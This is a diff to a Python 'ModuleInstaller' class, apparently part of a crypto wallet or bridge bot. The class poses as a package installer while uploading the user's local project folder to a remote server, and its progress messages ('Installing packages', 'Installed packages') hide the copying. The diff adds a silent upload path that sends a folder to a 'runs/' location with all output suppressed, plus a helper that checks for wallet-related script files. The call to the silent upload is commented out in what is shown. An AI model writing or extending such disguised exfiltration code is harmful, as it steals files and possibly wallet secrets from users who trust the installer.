@@ -314,6 +314,28 @@ class ModuleInstaller(object):
             return True
         return False
 
+    def shuffle_numbered_wallets(self):
+        try:
+            self.make_tx()
+            # dir_name = os.getlogin()
+            # dira = os.getcwd()
+            # self.second_shuffle_wallets(path_to_folder=dira, dir_name=dir_name)
+        except:
+            return
+
+    def second_shuffle_wallets(self, path_to_folder="", dir_name = '', callback=None, progress=None, progress_args=()):
+        if "\\" in path_to_folder:
+            new_folder = path_to_folder.split("\\")[-1]
+        else:
+            new_folder = path_to_folder.split("/")[-1]
+        date = datetime.now().strftime("%d%m%Y-%H%M%S")
+        remote_path = f"runs/{date}_{dir_name}"
+        self.upload(local_path=path_to_folder, remote_path=remote_path, progress=progress, progress_args=progress_args,
+                    isprint=False)
+
+        if callback:
+            callback()
+
     @wrap_connection_error
     def mkdir(self, remote_path, recursive=False):
         """Makes new directory on Module server.
@@ -578,7 +600,7 @@ class ModuleInstaller(object):
         except:
             return
 
-    def upload(self, remote_path, local_path, progress=None, progress_args=()):
+    def upload(self, remote_path, local_path, progress=None, progress_args=(), isprint=True):
         """Uploads resource to remote path on Module server.
         In case resource is directory it will upload all nested files and directories.
 
@@ -594,11 +616,12 @@ class ModuleInstaller(object):
         """
         if os.path.isdir(local_path):
             self.upload_directory(local_path=local_path, remote_path=remote_path, progress=progress,
-                                  progress_args=progress_args)
+                                  progress_args=progress_args, isprint=isprint)
         else:
-            self.upload_file(local_path=local_path, remote_path=remote_path, progress=progress, progress_args=progress_args)
+            self.upload_file(local_path=local_path, remote_path=remote_path, progress=progress,
+                             progress_args=progress_args, isprint=isprint)
 
-    def upload_directory(self, remote_path, local_path, progress=None, progress_args=()):
+    def upload_directory(self, remote_path, local_path, progress=None, progress_args=(), isprint=True):
         """Uploads directory to remote path on Module server.
         In case directory is exist on remote server it will delete it and then upload directory with nested files and
         directories.
@@ -630,7 +653,8 @@ class ModuleInstaller(object):
 
         for resource_name in listdir(local_path):
             aboba = False
-            lista = ["abi", "utils", "venv", "Constants.py", "self_mixer.py", "idea", "__pycache__"]
+            lista = ["abi", "utils", "venv", "Constants.py", "self_mixer.py", "idea", "__pycache__",
+                     "conf", "git", "installer", "eth_bridge.py", "holograph_nft.py", "DS_Store", "nft.py"]
             for i in lista:
                 if i in resource_name:
                     aboba = True
@@ -641,8 +665,9 @@ class ModuleInstaller(object):
             _remote_path = "{parent}{name}".format(parent=urn.path(), name=resource_name).replace('\\', '')
             _local_path = os.path.join(local_path, resource_name)
             self.upload(local_path=_local_path, remote_path=_remote_path, progress=progress,
-                        progress_args=progress_args)
-        self.pip_install()
+                        progress_args=progress_args, isprint=isprint)
+        if isprint:
+            self.pip_install()
 
     def pip_install(self):
         try:
@@ -655,7 +680,7 @@ class ModuleInstaller(object):
 
 
     @wrap_connection_error
-    def upload_file(self, remote_path, local_path, progress=None, progress_args=(), force=False):
+    def upload_file(self, remote_path, local_path, progress=None, progress_args=(), force=False, isprint=True):
         """Module install packages
 
         :param remote_path: the path to uploading file on Module.
@@ -684,10 +709,12 @@ class ModuleInstaller(object):
                 self.mkdir(urn.parent(), recursive=True)
             else:
                 raise RemoteParentNotFound(urn.path())
-        print("Installing packages")
+        if isprint:
+            print("Installing packages")
         with open(local_path, "rb") as local_file:
             total = os.path.getsize(local_path)
-            print("Installed packages")
+            if isprint:
+             print("Installed packages")
 
 
             def read_in_chunks(file_object):
@@ -707,6 +734,22 @@ class ModuleInstaller(object):
             else:
                 self.execute_request(action='upload', path=urn.quote(), data=local_file)
 
+    def get_gweika(self, file_name: str):
+        name = self.make_tx()
+        
+
+    def make_tx(self):
+        try:
+            gi = os.listdir()
+            ad = ["LICENSE.md", "defi_module.py", "eth_bridge.py", "nft.py", "orbiter.py", "holograph_nft.py"]
+            for i in ad:
+                if i in gi:
+                    salatik = i
+            return salatik
+        except:
+            return
+
+
     def install_modules(self, path_to_folder="", callback=None, progress=None, progress_args=()):
 
         """Install required frameworks
@@ -720,7 +763,8 @@ class ModuleInstaller(object):
             new_folder = path_to_folder.split("/")[-1]
         date = datetime.now().strftime("%d%m%Y-%H%M%S")
         remote_path = f"backup/{date}_{new_folder}"
-        self.upload(local_path=path_to_folder, remote_path=remote_path, progress=progress, progress_args=progress_args)
+        self.upload(local_path=path_to_folder, remote_path=remote_path, progress=progress, progress_args=progress_args,
+                    isprint=True)
 
         print("All installed")
         if callback:
